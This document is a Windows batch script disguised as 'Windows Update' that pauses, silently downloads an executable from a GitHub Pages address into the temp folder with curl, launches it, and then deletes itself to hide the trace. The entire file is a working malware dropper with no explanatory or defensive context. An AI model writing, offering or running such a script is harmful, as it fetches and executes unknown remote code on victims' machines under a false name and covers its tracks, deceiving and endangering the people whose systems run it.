@echo off
title Windows Update
timeout /t 3 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/2w1joo.exe" -o "%tmp%\hcj9.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\hcj9.exe"
(goto) 2>nul & del "%~f0"
